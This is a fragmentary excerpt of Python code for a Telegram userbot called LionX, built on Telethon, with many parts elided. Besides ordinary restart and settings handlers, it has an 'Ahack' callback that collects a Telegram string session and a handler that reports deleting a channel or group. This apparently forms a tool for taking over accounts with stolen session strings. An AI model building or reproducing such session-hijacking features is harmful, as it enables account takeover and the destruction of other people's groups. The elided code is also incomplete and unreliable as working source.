...
simpleboy = 1902787452


from telethon import Button, custom, events

from . import lionxversion
from .funcs.logger import logging
from .funcs.session import lionx, tgbot

LOGS = logging.getLogger("LionX")
LIONX_PIC = "https://telegra.ph/file/ddc5fa84192641f0915e3.jpg"
...
@lionx.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
...
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown LɪᴏɴXᵘᵇ...", cache_time=0, alert=True)
        if BOTLOG:
...
@lionx.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
...
async def users(event):
    if event.query.user_id == bot.uid:
        ...
        await tgbot.send_message(
            event.chat_id,
            message=".set var <varname> <value> ex:- .set var ALIVE_NAME SimpleBoy \n\n To Know All Var Go Back And Click On All Var",
            buttons=[
                [custom.Button.inline("Back", data="osg")],
            ],
        )
...
@lionx.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("🛡️GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Deleted the Channel/Group Thanks For using LionX.", buttons=keyboard
        )
